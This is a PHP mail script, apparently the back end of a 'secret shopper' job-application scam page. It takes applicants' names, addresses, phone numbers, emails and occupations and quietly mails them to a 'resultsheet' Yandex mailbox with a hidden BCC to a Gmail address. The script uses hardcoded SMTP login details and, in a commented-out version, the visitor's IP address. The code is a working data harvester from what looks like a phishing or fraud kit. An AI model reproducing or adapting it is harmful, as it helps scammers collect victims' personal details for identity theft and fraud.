<?php
//ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);
date_default_timezone_set('Africa/Lagos');
 include 'mail/PHPMailerAutoload.php';
//CB-Applicant

$first_name = $_POST['first_name'];
$last_name = $_POST['last_name'];
$phone = $_POST['phone'];
$address = $_POST['address'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip_code = $_POST['zip_code'];
$emailAddress = $_POST['email'];
$mobile = $_POST['mobile'];
$occupation = $_POST['occupation'];
$subj = "CB-Applicant";
$from =$_POST['email'];
$ip = getenv("REMOTE_ADDR");
/*$msg = "Full Name: $first_name $last_name\nMailing Address : $address \nCity, State, Zip Code : $city $state $zip_code\nPhone Number : $phone\nMobile Phone : $mobile\nEmail : $email  \nOccupation : $occupation\nIP : $ip;
++++++++++++++++\n";
$from =$_POST['email'];
$to = "
resultsheet@yandex.com,$to";
mail($to, $subj, $msg, $from);*/

if(isset($_POST['enter'])){

    $mailusername = 'info@secretshoppers.gq';
    $mailpassword = 'secretshoppers.gq'; 
    $email = new PHPmailer;
    //$email -> isSMTP();
    $email->SMTPKeepAlive = true;   
    $email->Mailer = 'smtp';
    $email -> SMTPAuth = true;
    $email->SMTPDebug = 0;
    $email->Host = 'webhosting2023.is.cc';
    $email->Port = 465;
    $email->SMTPSecure = 'ssl';
    $email->Username = $mailusername;
    $email->Password = $mailpassword;
    $email->setFrom('info@secretshoppers.gq', 'secretshoppers');
    $email->addAddress('resultsheet@yandex.com', $first_name);
    $email->addBcc('jamesperry080@gmail.com', $first_name);
    $email->Subject = 'Secret Shoppers Form';
    ob_start();
    include "send.php"; 
    $emessage = ob_get_contents();
    ob_end_clean();
    $email->msgHTML($emessage, dirname(__FILE__));
    $email->AltBody = $emessage;
    if (!$email->send()) {
         echo "<script> 
                window.location = 'index.html#application'
            </script>";
    } else {
         echo "<script> 
                window.location = 'received.html'
            </script>";
    }
    
}

?>